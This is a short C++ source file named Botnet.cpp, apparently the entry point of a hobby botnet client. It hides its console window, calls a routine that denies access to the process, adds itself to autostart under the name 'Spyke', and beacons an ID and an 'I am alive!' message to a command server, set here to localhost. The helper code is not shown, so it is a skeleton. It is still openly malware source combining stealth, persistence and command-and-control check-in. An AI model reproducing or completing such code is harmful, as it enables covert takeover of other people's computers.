// Botnet.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "Utils.h"
#include "Connection.h"

char* ip = "127.0.0.1";
Utils utils;
Connection conn(ip);
hash<long long> h;
int main()
{
	utils.HideConsole();
	utils.DenyAccess();
	utils.Autoload("Spyke","D:\\Botnet.exe");
	char buffer[1024];
	sprintf_s(buffer, sizeof(buffer), "%u", h(time(NULL)));
	conn.Send(buffer);
	conn.Send("I am alive!");
	system("pause");
    return 0;
}

